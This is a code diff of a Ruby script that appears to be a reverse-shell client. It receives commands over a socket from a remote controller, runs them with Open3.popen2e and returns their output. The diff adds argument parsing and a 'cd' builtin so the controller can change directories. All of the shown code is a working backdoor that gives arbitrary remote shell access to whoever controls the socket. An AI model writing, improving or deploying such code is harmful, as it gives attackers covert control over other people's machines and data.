@@ -1,15 +1,24 @@
 require 'socket'
 require 'open3'
+require 'shellwords'
 def command_loop(socket)
 	loop {
 		command = socket.recv(1024)
-		command = command.strip
+		command = command.chomp
 		exit if command == 'exit'
-		stdin, stdout_and_stderr, wait_thr = Open3.popen2e("#{command}")
-		socket.print("#{stdout_and_stderr.readlines.join.chomp}\0")
+    shell_command, *arguments = Shellwords.shellsplit(command)
+    if BUILTINS[shell_command]
+			BUILTINS[shell_command].call(*arguments)
+			socket.print(Dir.pwd)
+		else
+		  stdin, stdout_and_stderr = Open3.popen2e("#{command}")
+		  socket.print("#{stdout_and_stderr.readlines.join.chomp}\0")
+		end
 	}
-	rescue
-		@socket.print("command does not exist\0")
+	rescue => e
+		puts e
+
+		@socket.puts("command does not exist\0")
 		command_loop(@socket) 
 end
 def connect_to_host()
@@ -20,5 +29,6 @@ def connect_to_host()
 	command_loop(@socket)
 end
 begin
+	BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
 	connect_to_host()
 end
